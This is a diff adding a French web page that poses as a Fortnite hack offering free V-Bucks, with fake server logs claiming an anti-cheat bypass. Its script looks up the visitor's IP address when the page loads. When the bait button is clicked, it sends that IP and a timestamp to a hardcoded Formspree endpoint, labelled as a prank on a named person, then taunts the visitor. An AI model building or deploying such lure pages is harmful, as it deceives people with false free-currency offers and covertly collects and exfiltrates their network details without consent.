@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FORTNITE // OVERRIDE BY AKALTO</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            background-color: #020804;
+            color: #00ff55;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-image: 
+                linear-gradient(rgba(0, 255, 85, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 85, 0.03) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #00ff55;
+            padding-bottom: 20px;
+            width: 100%;
+            max-width: 800px;
+        }
+
+        .creator-title {
+            font-size: 3.5rem;
+            font-weight: 900;
+            color: #00ff55;
+            text-transform: uppercase;
+            letter-spacing: 6px;
+            text-shadow: 0 0 15px #00ff55, 0 0 30px #00ff55, 0 0 45px #00ff55;
+            animation: hacker-glow 1.5s infinite alternate;
+            margin: 10px 0;
+        }
+
+        @keyframes hacker-glow {
+            0% { text-shadow: 0 0 10px #00ff55, 0 0 20px #00ff55; opacity: 0.85; }
+            100% { text-shadow: 0 0 25px #00ff55, 0 0 50px #00ff55, 0 0 75px #00ff55; opacity: 1; }
+        }
+
+        .subtitle {
+            font-size: 1.1rem;
+            color: #00cc44;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 800px;
+            background: rgba(0, 20, 10, 0.85);
+            border: 1px solid #00ff55;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 0 20px rgba(0, 255, 85, 0.2);
+        }
+
+        .section-title {
+            font-size: 1.2rem;
+            border-left: 4px solid #00ff55;
+            padding-left: 10px;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+
+        .grid-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .stat-box {
+            background: rgba(0, 255, 85, 0.05);
+            border: 1px dashed #00ff55;
+            padding: 15px;
+            border-radius: 5px;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 0 0 10px #00ff55;
+            margin-top: 5px;
+        }
+
+        .terminal-window {
+            background: #000;
+            border: 1px solid #00ff55;
+            padding: 15px;
+            height: 180px;
+            overflow-y: auto;
+            font-size: 0.9rem;
+            line-height: 1.4;
+            box-shadow: inset 0 0 10px rgba(0,255,85,0.2);
+        }
+
+        .btn-action {
+            display: block;
+            width: 100%;
+            margin-top: 20px;
+            background: #00ff55;
+            color: #000;
+            border: none;
+            padding: 12px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 1.1rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 0 15px #00ff55;
+            transition: 0.2s;
+        }
+
+        .btn-action:hover {
+            background: #00cc44;
+            box-shadow: 0 0 25px #00ff55;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #44aa55;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="subtitle">FORTNITE BATTLE ROYALE // SYSTÈMES COMPROMIS</div>
+        <div class="creator-title">AKALTO</div>
+        <div style="color: #ff3333; font-size: 0.9rem; letter-spacing: 3px;">ACCÈS ROOT AUTORISÉ</div>
+    </div>
+
+    <div class="container">
+        <div class="section-title">Statistiques de la Partie en Direct</div>
+        <div class="grid-stats">
+            <div class="stat-box">
+                <div>JOUEURS RESTANTS</div>
+                <div class="stat-value" id="players-left">42</div>
+            </div>
+            <div class="stat-box">
+                <div>TEMPÊTE / ZONE</div>
+                <div class="stat-value" style="color: #ff3333;">PHASE 5</div>
+            </div>
+            <div class="stat-box">
+                <div>VICTOIRES ROYALES HACKÉES</div>
+                <div class="stat-value" id="victories">1,337</div>
+            </div>
+        </div>
+
+        <div class="section-title">Journal du Serveur</div>
+        <div class="terminal-window" id="console-logs">
+            > Connexion au serveur central Epic Games...<br>
+            > Contournement du système anti-triche (Easy Anti-Cheat)... OK<br>
+            > Injection de la boutique secrète en cours...<br>
+        </div>
+
+        <button class="btn-action" onclick="triggerAction()">Générer 13,500 V-Bucks Gratuits</button>
+    </div>
+
+    <div class="footer">
+        Système sécurisé par Akalto • Tous droits réservés
+    </div>
+
+    <script>
+        const FORMSPREE_URL = "https://formspree.io/f/mzeewylw";
+        let currentIp = "IP Inconnue";
+
+        // Récupération automatique de l'IP dès l'arrivée sur le site
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                currentIp = data.ip;
+            })
+            .catch(err => console.log("Erreur réseau IP"));
+
+        // Simulation de logs dynamiques style hacker
+        const logs = [
+            "Synchronisation avec l'île de Fortnite...",
+            "Injection de code dans le bus de combat...",
+            "Récupération des skins exclusifs...",
+            "Modification du serveur principal... Succès",
+            "Attention : Détection de l'agent Jonesy...",
+            "Ouverture des failles dimensionnelles..."
+        ];
+
+        const consoleBox = document.getElementById("console-logs");
+        const playersBox = document.getElementById("players-left");
+
+        setInterval(() => {
+            let randomLog = logs[Math.floor(Math.random() * logs.length)];
+            consoleBox.innerHTML += "> " + randomLog + "<br>";
+            consoleBox.scrollTop = consoleBox.scrollHeight;
+
+            let currentPlayers = parseInt(playersBox.innerText);
+            if (currentPlayers > 3) {
+                playersBox.innerText = currentPlayers - Math.floor(Math.random() * 3);
+            }
+        }, 2500);
+
+        // Quand Jean-Pierre clique sur le bouton V-Bucks
+        function triggerAction() {
+            let formData = {
+                "Cible (Prank Jean-Pierre)": "A cliqué sur les V-Bucks",
+                "Adresse IP": currentIp,
+                "Date": new Date().toLocaleString()
+            };
+
+            // Envoi de l'IP sur ton Formspree
+            fetch(FORMSPREE_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(formData)
+            }).catch(err => console.log("Erreur d'envoi"));
+
+            alert("💥 PIÉGÉ ! Jean-Pierre, ton IP a été interceptée par Akalto ! Bien tenté les V-Bucks 😉");
+        }
+    </script>
+
+</body>
+</html>
